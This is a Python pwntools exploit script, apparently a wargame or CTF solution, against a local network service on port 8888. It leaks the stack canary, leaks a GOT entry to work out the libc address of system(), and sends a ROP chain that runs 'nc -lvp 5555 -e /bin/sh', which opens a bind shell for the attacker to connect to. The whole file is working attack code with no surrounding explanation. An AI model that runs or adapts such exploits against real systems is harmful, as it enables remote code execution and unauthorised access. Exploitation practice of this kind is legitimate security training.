# http://nextline.tistory.com/103
from pwn import *

system_off = 0x9ac50
write_plt = p32(0x80486e0)
write_got = p32(0x804b040)
writable_add = p32(0x0804b080 + 0x10)
read_plt = p32(0x8048620)
pppr = p32(0x08048b2c)
cmd = 'nc -lvp 5555 -e /bin/sh\x00'

def Canary_leak():
	s = remote('127.0.0.1', 8888)

	print '[+] WAIT 2 SECOND'
	s.recvuntil('>')
	s.sendline('4')

	print '[+] LEAK CANARY'
	s.recvuntil(') ')
	s.send('y' * 11)
	canary = u32("\x00" + s.recvuntil("'!")[23:26])

	print '[+] FOUND CANARY : ' + hex(canary)

	s.close()
	return canary

def system_add_leak(canary):
	s = remote('127.0.0.1',8888)

	print '[+] WAIT 2 SECOND'
	s.recvuntil('>')
	s.sendline('4')

	print '[+] LEAK WRITE_ADD'
	s.recvuntil(') ')

	payload = 'y' * 10 + p32(canary) + 'A' * 12
	payload += write_plt + pppr + p32(4) + write_got + p32(4) #leak

	s.send(payload)
	#s.recvuntil(')"\n')

	write_add = u32(s.recv(4))
	print '[+] FOUND WRITE_ADD : ' + hex(write_add)

	system_add = write_add - system_off
	print '[+] FOUND SYSTEM_ADD : ' + hex(system_add)

	s.close()
	return system_add

def Exploit(canary,system_add):
	s = remote('127.0.0.1', 8888)

	print '[+] WAIT 2 SECOND'
	s.recvuntil('>')
	s.sendline('4')

	s.recvuntil(') ')

	payload = 'y' * 10 + p32(canary) + 'A' * 12
	payload += read_plt + pppr + p32(4) + writable_add + p32(len(cmd))
	payload += system_add + pppr + writable_add

	print '[+] SEND PAYLOAD'
	s.send(payload)

	print '[+] WRITE CMD'
	sleep(0.1)
	s.send(cmd)

	print '[+] Clear! You should input "nc ip 5555"'


def main():
	canary = Canary_leak()
	system_add = system_add_leak(canary)
	Exploit(canary, p32(system_add))

if __name__ == "__main__":
	main()
